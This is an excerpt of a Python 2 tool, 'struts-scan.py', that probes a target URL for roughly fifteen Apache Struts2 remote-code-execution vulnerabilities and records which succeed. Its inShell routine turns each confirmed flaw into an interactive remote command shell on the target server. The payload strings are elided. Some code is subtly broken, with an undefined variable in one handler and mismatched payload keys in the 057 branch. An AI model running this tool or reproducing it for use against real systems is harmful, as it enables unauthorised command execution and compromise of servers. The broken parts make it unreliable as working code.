...
class struts_baseverify:
    def __init__(self, url):
        self.url = url
        self.cookie = {"SessionId":"96F3F15432E0660E0654B1CE240C4C36"}
        self.poc = {
    ...
    def check(self, pocname, vulnstr):
        if vulnstr.find("Active Internet connections") is not -1:
            ...
            filecontent.writelines(pocname+" success!!!"+"\n")
        elif vulnstr.find(u"活动连接") is not -1:
            cprint(u"目标存在" + pocname + "漏洞..[Windows]", "red")
            filecontent.writelines(pocname+" success!!!"+"\n")
    ...
    def scan(self):
        ...
        filecontent.writelines(u"检测struts2漏洞: "+self.url)
        filecontent.write("\n")
        try:
            req = requests.post(self.url, headers=headers, cookies = self.cookie, data=self.poc['ST2-005'], timeout=6, verify=False)
        ...
        try:
            req = requests.post(self.url, headers=headers, cookies = self.cookie, data=self.poc['ST2-009'], timeout=6, verify=False)
        ...
        try:
            req = requests.post(self.url, headers=headers, cookies = self.cookie, data=self.poc['ST2-013'], timeout=6, verify=False)
        ...
        try:
            req = requests.post(self.url, headers=headers, cookies = self.cookie, data=self.poc['ST2-016'], timeout=6, verify=False)
        ...
        try:
            req = requests.post(self.url, headers=headers, cookies = self.cookie, data=self.poc['ST2-019'], timeout=6, verify=False)
        ...
        try:
            req = requests.get(self.url+self.poc['ST2-devmode'], headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req = requests.get(self.url+self.poc['ST2-032'], headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req = requests.get(self.url+self.poc['ST2-033'], headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req = requests.get(self.url+self.poc['ST2-037'], headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req = requests.get(self.url, headers=headers2, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            ...
            req = requests.post(self.url, files=files, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            ...
            req = requests.post(vulnurl, data=postdata, headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req1 = requests.get(self.url+"?class[%27classLoader%27][%27jarPath%27]=1", headers=headers, cookies = self.cookie, timeout=6, verify=False)
            req2 = requests.get(self.url+"?class[%27classLoader%27][%27resources%27]=1", headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            req = requests.post(self.url, data=self.poc['ST2-052'], headers=headers_052, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            ...
            for param in params:
                ...
                req = requests.get(vulnurl, headers=headers, cookies = self.cookie, timeout=6, verify=False)
        ...
        try:
            self.url = self.url.rsplit("/",1)[0] + '/${12345%2a54321}/' + self.url.rsplit("/",1)[1]
            req = requests.get(self.url, timeout=6, verify=False, allow_redirects=True)
            if r"670592745" in req.url:
                cprint(u"目标存在struts2-057漏洞..", "red")
                filecontent.writelines("struts2-057 success!!!\n")
            else:
                cprint(u"目标不存在struts2-057漏洞..", "green")
        except:
            cprint(u"检测struts2-057超时..", "cyan")
            print u"超时原因: ", e
    ...
    def inShell(self, pocname):
        ...
        if pocname == "struts2-005":
            while True:
                ...
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-005'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
        ...
        if pocname == "struts2-009":
            while True:
                ...
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-009'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
        ...
        if pocname == "struts2-013":
            while True:
                ...
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-013'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
        ...
        if pocname == "struts2-016":
            while True:
                ...
                if command != "exit":
                    try:
                        commurl = self.url
                        req = requests.post(commurl, data=self.shell['struts2-016'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
            ...
            while True:
                ...
                if command != "exit":
                    try:
                        ...
                        req = requests.post(self.url, data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
            ...
            while True:
                ...
                if command != "exit":
                    try:
                        ...
                        req = requests.get(commurl, headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
                else:
        ...
        if pocname == "struts2-053":
            param = raw_input(u"请指定struts2-053参数: ")
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
        ...
        if pocname == "struts2-057":
            while True:
                ...
                if command != "exit":
                    try:
                        commurl = self.url
                        req1 = requests.post(commurl, data=self.shell['struts2-017-1'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        req2 = requests.post(commurl, data=self.shell['struts2-017-2'].replace("FUZZINGCOMMAND", command), headers=headers, cookies = self.cookie, timeout=6, verify=False)
                        print req1.text
                        print req2.text
                    except:
                        cprint(u"命令执行失败!!!", "red")
...
if __name__ == "__main__":
    usage = u'''
Usage:  python struts-scan.py http://example.com/index.action  检测
